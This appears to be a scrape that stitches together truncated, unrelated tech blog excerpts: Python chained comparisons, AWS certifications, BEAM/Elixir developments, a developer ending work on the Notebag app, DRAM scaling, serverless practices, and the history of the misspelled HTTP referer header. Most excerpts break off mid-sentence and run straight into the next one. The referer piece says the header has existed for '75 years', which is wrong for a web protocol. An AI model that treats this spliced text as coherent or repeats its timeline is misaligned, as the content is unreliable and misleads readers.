<p><img src="https://media.giphy.com/media/3oEduU8I0dHP38CdLW/giphy.gif" alt="A dog playing on grass and failing"></p>
<p>Chained operations are an exceptional feature. It makes the code terse without sacrificing readability. I discuss it in more detail in another blog <a target="_blank" href="https://miguendes.me/5-hidden-python-features-you-probably-never-heard-of">post</a> but to provide you a bit of context let’s see it in action.</p>
<pre><code><span>&gt;&gt;&gt; </span>x = <span>10</span>
<span>&gt;&gt;&gt; </span><span>20</span> == x == <span>0</span>
<span>False</span>
<span>&gt;&gt;&gt; </span><span>25</span> &gt; x &lt;= <span>15</span>
<span>True</span>
</code></pre>
<p>Let's pay close attention to the first example. If Python didn't have this feature, that statement could be re-written as:</p>
<pre><code>In [<span>53</span>]: <span>20</span> == x <span>and</span> x == <span>0</span>
Out[<span>53</span>]: <span>False</span>
</code></pre>
<p>Now, what happens if we add parentheses to enforce some kind of precedence?</p>
<pre><code>In [<span>51</span>]: <span>20</span> == x == <span>0</span>
Out[<span>51</span>]: <span>False</span>

In [<span>52</span>]: (<span>20</span> == x) == <span>0</span>
Out[<span>52</span>]: <span>True</span>
</code></pre>
<blockquote>
<p>Wait? What on earth has just happened?</p>
</blockquote>
<p>When we added the parentheses, <code>(20 == x)</code> was evaluated to <code>False</code>. However, the problem is that <code>False</code> is then compared to <code>0</code>.  ̶S̶i̶n̶c̶e̶ ̶<code>̶0̶</code>̶ ̶i̶s̶ ̶c̶o̶n̶s̶i̶d̶e̶r̶e̶d̶ ̶a̶ ̶"̶F̶a̶l̶s̶y̶"̶ ̶v̶a̶l̶u̶e̶,̶ ̶t̶h̶e̶n̶ ̶t̶h̶e̶ ̶c̶o̶m̶p̶a̶r̶i̶s̶o̶n̶ ̶r̶e̶t̶u̶r̶n̶s̶ ̶'̶T̶r̶u̶e̶`̶.̶</p>
<p>As pointed out by <a href="https://hashnode.com/@alexmojaki" target="_blank" rel="noopener noreferrer">@alexmojaki</a>, <code>False == 0</code> is <code>True</code> because <code>bool</code> is a subclass of <code>int</code>. For instance, other "Falsy" values such as <code>[]</code> or <code>""</code> are not equal to <code>False</code>.</p>
<pre><code>In [<span>54</span>]: <span>False</span> …</code></pre></div></div>

<a href="https://www.statista.com/chart/18819/worldwide-market-share-of-leading-cloud-infrastructure-service-providers/">Source</a></p><p>Because of this, AWS certifications are in very high demand. I decided a few months ago that it's time for me to step up and at least get the <a href="https://aws.amazon.com/certification/certified-cloud-practitioner/">Cloud Practitioner certification</a>, and probably others like the <a href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">Solutions Architect Associate</a>.</p><h2>Big AWS Concepts for Developers</h2><p>Let's lay down a couple of definitions to help you as you progress in your AWS education.</p><p>First, what are <strong>cloud computing</strong> and <strong>cloud infrastructure</strong>? In short, this means that instead of you having to physically set up servers and networks in your garage or at your company, you "rent" these from Amazon. Everything you might want to do to run a website <!-- -->—<!-- --> the hardware that runs the server, the database, the storage that holds the frontend and static files, and the domain name configuration <!-- -->—<!-- --> can be done using AWS's networking and computing resources.</p><p>Why does this matter? The main reason is <strong>scalability</strong>: the ability to grow based on demand. AWS alleviates both the cost and logistics of scaling a service or business. Imagine you're running an online store for dog toys on a single server in your garage (you probably bought it on eBay). Suddenly, <a href="https://twitter.com/dog_feelings">Thoughts of Dog</a> tweets about your store and your traffic spikes by twenty times as millions of people try to buy your bespoke artisan chew toys. What's going to happen? Most likely your server will crash due to that much demand. You're frantically searching eBay for another server and some networking equipment, but it will likely cost you a couple thousand bucks and several days to upgrade your server or add additional servers to your network. Ouch! (Incidentally, a show that demonstrates this dilemma perfectly is <a href="https://www.imdb.com/title/tt2543312/">Halt and Catch Fire</a>, which is about startups in the 80s.)</p><p>Services like AWS, Azure, and Google Cloud Platform came along and revolutionized the industry. Now instead of needing to buy a brand new server, you can click a button and immediately grow your infrastructure. Even better, you can automatically grow and shrink your infrastructure as demand for your site or service fluctuates. This helps keeps costs more predictable and spreads them out over time instead of all at once with big hardware purchases.</p><h2>Key AWS Services for Developers</h2><p>When approaching AWS as a developer, there are a few of the core services that you'll likely encounter right away, so here's a quick overview of those:</p><ul><li><strong>Lambda</strong>: Serverless functions are kind of a gateway for developers into AWS and cloud infrastructure. In AWS, Lambda is the service that runs these functions. Serverless functions let you perform calculations or access databases without having a physical server.</li><li><strong>S3</strong>: S3 stands for Simple Storage Service. This is where you host static files such as HTML, images, or videos.</li><li><strong>Route 53</strong>: Route 53 is where you set up DNS for domain names. "Route" is a reference to US Route 66 and "53" is a reference to TCP or UDP port 53, where DNS server requests are addressed.</li><li><strong>EC2</strong>: Elastic Compute Cloud (EC2) is where you run servers. If you're looking to run an API or a traditional web app using something like Node or Nest, this is what you want. EC2 costs can add up quick, so be careful experimenting with these.</li><li><strong>RDS</strong>: RDS stands for Relational Database Service so this is where you'll set up databases such as MySQL, PostgreSQL, and Microsoft SQL Server.</li><li><strong>DynamoDB</strong>: DynamoDB is Amazon's No SQL solution similar to MongoDB.</li><li><strong>Amplify</strong>: Amplify is a platform for building full stack apps quickly. The Amplify Framework consists of 3 components including libraries, UI components, and a CLI toolchain, while the Amplify Console is a static web hosting service.</li></ul><p>These are the core services I would focus on as a developer getting started with AWS. There are many, many more services relevant to developers, but getting a handle on the basics of these will get you quite a long way.</p><h2>AWS Pitfalls for Developers</h2><p>The two main pitfalls you might run into as you learn AWS (other than its sheer complexity) are <strong>billing</strong> and <strong>identity and access management (IAM)</strong>.</p><p>AWS is not free to use, though there is a free tier and some services are free. Usually these costs are minor for short periods of time, but beware: if you run through a tutorial and then forget to clean up after yourself, you might face a big bill at the end of the month! Be sure to know what costs you're incurring as you do tutorials and try to shut down and delete anything you don't need when you're finished. AWS also lets you create billing alerts that will email you when you've hit a threshold. Here's a great <a href="https://egghead.io/playlists/use-aws-billing-cost-management-dashboard-to-keep-your-aws-bill-to-minimum-ff0f">egghead collection on AWS cost management</a> that will help a lot.</p><p>The other really sticky area in AWS is security. Identity and Access Management (IAM) in AWS is extremely complex. There are many layers of permissions for each service, user, and group. Most tutorials will help you navigate the basic set up that you will need to get things done. Be careful that you're not leaving yourself open to big vulnerabilities as you learn. Not only does that open the door to data theft, but it could also result in huge bills if someone gets a hold of your root account. This doc is kind of scary, but you're going to want to get familiar with <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html">security best practices in AWS</a> little by little. At the very least, secure your root account and enable MFA.</p><p>For the sake of both billing and IAM, you will likely want to avoid using your employer's AWS account to learn. If your job is the motivation for learning AWS, work with your company on creating a sandboxed account with a given budget.</p><h2>Overview of AWS Certifications</h2><p>While not all certifications in tech are created equal, AWS certifications are extremely valuable. They're designed to minimize false positives and fairly rigorous, so employers know they can use them as a solid benchmark of knowledge. This means they can add some zeroes to your paycheck and set you apart from the average developer.</p><p>There are many different AWS certifications, so let's break down what the options are.</p><p>The <a href="https://aws.amazon.com/certification/certified-cloud-practitioner/">Cloud Practicioner exam</a> is considered a <strong>Foundational</strong> exam recommended for people with 6 months of fundamental AWS knowledge. It's high-level and not super technical, but gets your feet with AWS.</p><p>From there, there are three <strong>Associate</strong> level exams, recommended for people with 1 year of experience solving problems and implementing solutions using AWS. These exams have broad scope but shallow depth and break into three paths: Architect, Operations, and Developer. The three exams are:</p><ul><li><a href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">Solutions Architect Associate</a></li><li><a href="https://aws.amazon.com/certification/certified-sysops-admin-associate/">SysOps Administrator Associate</a></li><li><a href="https://aws.amazon.com/certification/certified-developer-associate/">Developer Associate</a></li></ul><p>From there, there are two <strong>Professional</strong> certifications, recommended for people with 2 years of comprehensive experience designing, operating, and troubleshooting solutions using AWS. These exams have broader scope and are quite deep. The Architect path remains, but Developer and Operations combine into DevOps. The two exams are:</p><ul><li><a href="https://aws.amazon.com/certification/certified-solutions-architect-professional/">Solutions Architect Professional</a></li><li><a href="https://aws.amazon.com/certification/certified-devops-engineer-professional/">DevOps Engineer Professional</a></li></ul><p>There are also six <strong>Specialty</strong> exams, which are very narrow in scope but very deep:</p><ul><li><a href="https://aws.amazon.com/certification/certified-advanced-networking-specialty/">Advanced Networking Specialty</a></li><li><a href="https://aws.amazon.com/certification/certified-security-specialty/">Security Specialty</a></li><li><a href="https://aws.amazon.com/certification/certified-machine-learning-specialty/">Machine Learning Specialty</a></li><li><a href="https://aws.amazon.com/certification/certified-alexa-skill-builder-specialty/">Alex Skill Builder Specialty</a></li><li><a href="https://aws.amazon.com/certification/certified-data-analytics-specialty/">Data Analytics Specialty</a></li><li><a href="https://aws.amazon.com/certification/certified-database-specialty/">Database Specialty</a></li></ul><p>I decided to get some of these certifications as a way to guarantee that I will actually set aside the time to learn some AWS and have something to show for it. My plan is to get the Cloud Practicioner and then the Solutions Architect Associate. Why not the Developer Associate first? Well, my understanding is that the Solutions Architect Associate is more comphrensive than the Developer Associate, and thus it's easier to get the Developer Associate after getting the Solutions Architect Associate. It also sets you up to get the Solutions Architect Professional, which is extremely difficult and highly coveted (and thus should come with a big pay raise!). The SA-P requires the SA-A, so it makes sense to go that route. I'll update this article when I've got some results.</p><h2>AWS Resources for Developers</h2><p>There are boatloads of resources for learning AWS out there. Some are geared towards infrastructure and networking folks, some are geared towards database admins, some for security teams, and others towards developers. Here are the key resources I've been using and a variety of others I've found useful.</p><h3>My Essential AWS Resources</h3><p>I've found myself relying pretty heavily on these resources in my own AWS journey:</p><ul><li><a href="https://acloud.guru/">A Cloud Guru</a>: A Cloud Guru is hands down the single best resources out there for learning AWS and just about any other cloud technology. I am honestly blown away. Just the <a href="https://acloud.guru/learn/aws-certification-preparation?_ga=2.170270560.1574418745.1603210089-860129520.1602887034">AWS Certification Preparation Guide</a> is worth the cost of admission. I'm working my way through the Developer Learning Path and about halfway through the <a href="https://acloud.guru/learn/aws-certified-cloud-practitioner?_ga=2.124181706.1574418745.1603210089-860129520.1602887034">Cloud Practitioner 2020 course</a>. I've also used A Cloud Guru a <em>ton</em> for work whenever I've needed to look up terms or concepts I don't understand. I had a big annoying run-in with VPCs and private networks and A Cloud Guru seriously came to my rescue.</li><li><a href="https://cloudnewbies.com/">Cloud Newbies Discord</a>: This is a Discord server founded by <a href="https://twitter.com/hirokonishimura">Hiroko Nishimura</a>, creator of <a href="https://awsnewbies.com/">AWS Newbies</a> (which is another great site full of articles, books, and exam tips). It is immensely helpful to have a welcoming and friendly community of people with whom to learn. The server has different channels for different cloud technologies and certifications, and the …</li></ul></article></div>

        <small>2020-10-26</small>
        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don’t know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn’t exist without the BEAM. With that bit of background I’d like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I’ve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I’ve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application “get to IO, don’t compute”. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn’t compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don’t think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It’s probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I’ve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I’m a hardware hobbyist, not an IoT dev but I’ve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that’s a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Saša Jurić, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I’ve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn’t replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don’t actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we’d otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don’t. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn’t BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn’t be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>27th October 2020</p>


<p><strong>TL;DR: I am stopping work on Notebag.</strong> It is causing me lots of stress and guilt and I currently
have neither the capacity nor the will to update it right now and for the foreseeable future.
It is available free and open-source <a href="https://github.com/pretzelhands/notebag">on GitHub.</a> You can extend it!
If you bought your license in the past 30 days, send me an email with your order number and I'll refund it.</p>

<hr>

<p>So. Here we are. The irony of my last two blog posts being about the start and end of something is not lost
on me. I know that a few of you are probably confused, angry and perhaps even a bit sad right now, and I
apologize in advance. And some critical voices that have been haunting me around the internet have finally
been proven right.</p>
<p>Now let me tell you why exactly I am stopping work on Notebag, what will happen to it and where I will
be going from here.</p>
<h2>The Why</h2>
<p>One or two of you reading this might perhaps know what it's like when you start a new project. You come
up with a concept! Ideas burst through your head! You are itching to tear the world apart and make
things come alive exactly the way you imagined them. This is an absolute high of productivity and you
hack away until late at night, only to get up early next morning and get right back into it.</p>
<p>That was me. </p>
<p>That's how Notebag started, doubly fueled by the fact that the world in 2020 is .. something else
and I was shit-out-of-luck in terms of freelancing contracts. So I clung to the one thing I had and put
all of my energy into it and I worked to make it into something I thought was nice.</p>
<p>I pushed and pushed each day. Bigger! Better! More features!</p>
<p>And this worked well for a while, until the inevitable tiredness came creeping in. So I put Notebag on the
backburner. New freelancing contracts finally started trickling in and I found myself busy with two kinds of
work: The one paying my bills and the one I did on Notebag.</p>
<p>It was a struggle. Every day after work I tried to pour some of my remaining energy into Notebag, but nothing
happened. I failed to implement the most basic things and bit by bit, this intense feeling of guilt set in.</p>
<p>In time, I started avoiding Twitter. Because everytime I tweeted, I felt like someone out there would be
judging me. Why wasn't I reporting progress on Notebag? What was I even up to? And so I withdrew to the confines
of Telegram and ignored Twitter. DMs came in asking and I was too scared to reply.</p>
<p>Worst of all, I was and am building this subconscious pressure on myself that I am not really allowed to work on anything
else. Why would I work on <code>Project X</code> when Notebag fans are clamoring for updates? That makes me a bad person, no? This
has led me to a state where I was afraid to program outside of my contracts. Not a great spot to be in.</p>
<p>When you are not happy with things, you should change them. I am not happy with how Notebag is currently holding
a soft stranglehold on my life and so I am changing it.</p>
<h2>The What</h2>
<p>What does all of this mean for Notebag's future? First of all, I have <a href="https://github.com/pretzelhands/notebag">published the source code.</a>
It's MIT-licensed and on GitHub, free for everyone to download, build and play with. In my wildest dreams of course there
would be a shining community hero that rises up and picks up where I left off. But that is unlikely to happen.</p>
<p>So at least as a consolation, Notebag in its entirety is available for everyone, for all time, for free. If someone is
seriously willing to make pull requests and improve the code, I am happy to release signed builds with those changes
included. If anyone has specific questions about the architecture and why my code is so bad, I will gladly answer them.</p>
<p>This is, I think, the most elegant solution. It at least guarantees that the code doesn't just gather dust on my machine,
forever unreachable for any interested person. </p>
<p>And since there is still the occasional sale of a license, I offer anybody who bought their license in the past 30 days
(after September 27) a full refund, no questions asked. To avail this, just <a href="https://pretzelhands.com/cdn-cgi/l/email-protection#b3dbd6dfdfdcf3c3c1d6c7c9d6dfdbd2ddd7c09dd0dcde8cc0c6d1d9d6d0c78efddcc7d6d1d2d4968183e1d6c7dac1d6ded6ddc7968183e1d6d5c6ddd7">send me an email</a>
or send me a Twitter DM.</p>
<h2>The Future</h2>
<p>Notebags future probably does not hold many further improvements. I still use it as my personal preferred
note-taking app, because that was its purpose. It works for me and my workflow and I hope that other people will keep
on using it or maybe learn a thing or two from the source code.</p>
<p>Personally I only have one or two side projects, but I'll probably put them on indefinite hold. Clean slate.
There's a few other hobbies I've been meaning to get around to and I think right now is a good time to do that. And
perhaps, somewhere down the line an idea will strike me and I'll give in to the itch to build again. But the time for
that is not right now.</p>
<h2>Final words</h2>
<p>I would again like to apologize to anyone who put high hopes into this app. Turns out that the detractors who pointed out
my legacy of abandoned apps were onto something! It sucks to be known for this, but maybe one day that will change. Or
maybe it won't.</p>
<p>As it is, Notebag will keep working in its usual state for the foreseeable future. But maybe <code>Au revoir</code>, doesn't have
to mean goodbye forever. Not that I have any hopes of picking it back up, but if 2020 has taught the world anything,
it's that life is unpredictable.</p>
<p>For my final point I'd like to give a special shout-out to <a href="https://twitter.com/Clo__S">@Clo__S</a>, who aside from being
an early adopter and wonderful source of feedback was probably Notebag's most vocal fan. Thanks for all the support along
the way.</p>

<p>Moore’s law has been the driver of semiconductor capabilities and cost for decades. This phenomenon is still being pushed by the likes of TSMC, Intel, and Samsung in logic, but in DRAM, it is dead. DRAM scaling slowed significantly nearly a decade ago and it is moving at a snail’s pace now. New DRAM nodes are now a tiny fraction of a shrink. Going from 20nm to sub 10nm is going to take at least 5 different incremental node shrinks.</p>

<p>Density has not doubled over even the last 5 years. Despite this, DRAM demand has continued to grow at an incredible pace. This is not a shocker to anyone who follows the semiconductor field.</p>

<p>The death of this scaling is what caused previous price spikes. As technology scaling slows, the only way to produce DRAM is with more wafers. It became a very capital-intensive task to increase DRAM bit output when this became true.</p>

<p>Most of the wafer output increases will be coming from new fabs, as existing clean room space is bursting at the seams. This contrasts from Logic which requires much more clean room space and fab area for node shrinks, despite relatively stable wafer output on the leading edge.</p>

<p>More wafers require additional clean room space and semiconductor capital equipment. This spells great news for the likes of Applied Materials, ASML, Lam Reaseach, KLA-Tencor, and Tokyo Electron. Not all of these companies stand to gain the same and investors should keep this in mind when targeting the DRAM semi capital equipment market.</p>

<p>To productively build serverless &amp; distributed systems, we need to adopt new practices, some which may seem counterintuitive at first. This post will suggest five concrete practices to up your game.</p>
<p>Let’s jump in, roughly in order of importance:</p>
<h4 id="1-prefer-running-your-system-in-the-cloud-over-local-emulation">1. Prefer running your system in the cloud over local emulation</h4>
<p>Local development is sacred cow for many developers, being able to deploy, run and test an application or system on your laptop. But the reality of modern distributed systems is that some things cannot easily be emulated locally, if at all.</p>
<p>It is not for a lack of trying: systems running on Kubernetes are often emulated with Docker Compose or Minikube, with varying levels of success. For AWS Serverless, we have AWS SAM and LocalStack.</p>
<p>There are however a few issues with this type of emulation:</p>
<ul>
<li>The cost of maintaining emulation is high, since you effectively maintain two stacks - one for local development, and one for “real” deployment.</li>
<li>Emulation isn’t the real thing: you will find configuration drift, small or large differences in the behaviour of your stack.</li>
</ul>
<p>In summary, our experience of trying to maintain emulation is that the costs far outweigh the benefits. That effort should instead be put towards the ability to deploy local code quickly to the cloud environment, or where possible, connect a locally running process to a real environment in the cloud.</p>
<p>One of the great benefits of Serverless in particular, is that the cost of creating and provisioning <em>Feature Environments</em> is approaching zero. Moving local development to the cloud is a low-cost proposition.</p>
<h4 id="2-cicd-pipelines-are-not-enough-local-deployment-automation-is-crucial">2. CI/CD Pipelines are not enough, local deployment automation is crucial</h4>
<p>Given our stance on local emulation, the next instinct to suppress is that of relying on CI/CD to manage deployments to feature environments. If we rely entirely on CI pipelines for our ongoing development work, we end up wasting large amounts of time waiting for CI pipelines to build and deploy.</p>
<p>If instead, CI &amp; local development workflows can share as much as possible of deployment infrastructure, we should be able to reduce/remove this bottleneck on development, while also minimizing the duplicated effort of maintaining two types of automation.</p>
<p>In summary, any developer should trivially be able to:</p>
<ul>
<li>Deploy or connect locally built resources to their own feature environment in seconds with a single command from their laptop.</li>
<li>Deploy only the unit of deployment which has changed.</li>
<li>Have a development experience that is practically indistinguishable from “local development”.</li>
</ul>
<h4 id="3-for-aws-serverless--function-as-a-service---monolithic-functions-are-ok">3. For AWS Serverless &amp; “Function-as-a-Service” - monolithic functions are OK</h4>
<p>The first thing many teams do when they first start using AWS Lambda, is that they create separate deployable functions for every type of function invocation. For instance, a REST API gets a function for every single endpoint on the API. However, if you think in terms of <em>Domain Driven Design</em>, this might mean you end up with a number of functions that logically make up a single <em>Bounded Context</em>.</p>
<p>There are also practical considerations: as an example, AWS CloudFormation has a default limit of maximum 200 resources per stack. When you start adding up the multiplicative effect of the resources required for a Serverless application, you quickly realise that this is a limit that can be easily reached. Sticking to a service per Bounded Context, that acts as the target for multiple types of Lambda invocations is a sensible thing to do. Doing this will also reduce the automation and coordination overhead.</p>
<h4 id="4-consider-adopting-a-monorepo-with-tooling-appropriate-for-monorepos">4. Consider adopting a monorepo, with tooling appropriate for monorepos</h4>
<p>Let us start with a caveat emptor: monorepos without using appropriate tooling can be a disaster of slow CI pipelines &amp; low productivity. The upside is that some amazing and battle-tested tooling for monorepos exist these days (a personal favourite is <a href="https://bazel.build/">Bazel</a>, which originated from Google).</p>
<p>Without a monorepo, building distributed systems can be painful.</p>
<p>With dozens of repositories, code navigation for larger changes spanning multiple services become painful. Another thing that quickly becomes painful is dependency management, code sharing &amp; reuse. It is not uncommon to find that different components have different, mutually incompatible dependencies, which become painful to upgrade.</p>
<p>A monorepo negates these pains, while also making things such as security audits easier to conduct and address.</p>
<p>However, to avoid the “rebuild the universe” problem with monorepos, you need tooling that solves three problems:</p>
<ul>
<li>Change detection &amp; dependency-graph tracking.</li>
<li>Dependency-graph based rebuilds (rebuild only what has changed and what is invalidated by the change).</li>
<li>Build caching.</li>
</ul>
<h4 id="5-implement-all-three-pillars-of-observability">5. Implement all three pillars of observability</h4>
<p>Observability in control theory is defined as the ability to infer the internal state of a system by from knowledge about its external outputs. In practice, this is the triumvirate of event logs (log aggregation &amp; analytics), metrics (for alerting) &amp; tracing (driving visualization). Most organizations today skew heavily towards event logs only, with maybe some metrics, but very few do all three well.</p>
<p>In a distributed systems world, doing all three pillars of observability well means that the time to detect, find and address bugs and other issues can be cut down to a fraction of what it would otherwise be. Furthermore, great observability will also improve developer productivity, since we can better understand the state of our entire system.</p>
<p>This is perhaps an area where AWS Serverless stands out as a leader. While the Kubernetes eco-system is filled with many options of various complexity and quality, AWS gives us an easy way to achieve a high level of observability at low effort and cost. <em>CloudWatch Logs, CloudWatch Metrics</em> and <em>AWS X-Ray</em> can provide observability to a Serverless architecture at a relatively low threshold of effort and learning.</p>
<h4 id="conclusion">Conclusion</h4>
<p>It should be obvious by now that Serverless &amp; distributed systems require great discipline in deployment automation. It is unfortunate that many still make the distinction between deployment being an “ops” concern, separate from development.</p>
<p>Dev &amp; Ops in modern systems are intertwined, the level and quality of automation has a great impact on DevEx (Developer Experience), and thus developer productivity. It is not a concern that can be postponed or thought about after the fact: it requires effort initially, and disciplined refinement throughout. If this is done well, you will be able to develop with a speed, reliability and level of productivity that will run rings around the competition.</p>
<p>We will return to this subject in the future to show what a practical Serverless toolchain and reference architecture could look like. Feel free to sign up to our email list below to get notified when we do!</p>

The new field called <code>referer</code> — a misspelling of the word <i>referrer</i> — allowed "the client to specify, for the server's benefit, the address (URI) of the resource from which the Request-URI was obtained". A great addition to the protocol, but ter-ible spelling 😛</p><p>75 years later, on every website request that is made, there is now a <code>referer</code> header. Barker later <a href="https://groups.google.com/forum/?hl=en#!original/alt.folklore.computers/7X75In21_54/JgV9Rw04f-EJ" rel="noopener" target="_blank">joke</a>d that he was trying to get the Oxford English dictionary to adjust their spelling..."since my spelling is used several billion times a minute more than theirs" </p><p>SQL queries have been written, databases have been designed, bugs have been introduced...because of how Barker and Fieldings spelled this word. </p><a href="#&quot;in-this-great-future,-you-can't-forget-your-past&quot;" id="&quot;in-this-great-future,-you-can't-forget-your-past&quot;"><h2>"In this great future, you can't forget your past"</h2></a><p>Developing products is inherently path dependent. History matters. Every product decision you've made determines every product decision you're going to make in the future.</p><p><img src="https://n2parko.com/api/asset?assetUrl=https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F147e9b25-92c3-4534-bfef-510315be9d39%2FUntitled.png&amp;blockId=cb6c5a83-5484-4e3d-8049-e7c40cb03e23" alt="An image from Notion"></p><p>Product-Market Fit is where that initial path is set. It is Decision A. At that point, you could've head in any direction. You could turn around quickly, and head in another direction. But the further you go down a particular trail, the further you have to backtrack. The more people you convince to join you on the trail, the more you have to explain why <i>everyone</i> needs to turn around. </p><p>I've found that thinking about your product path dependency is a helpful framework for understanding why your product is the way it is, and how to shape its future. It helps clarify why parts of your product — the product you are building! — stink and are so hard to fix. It clarifies which decisions matter and which do not. </p><p>And it helps you 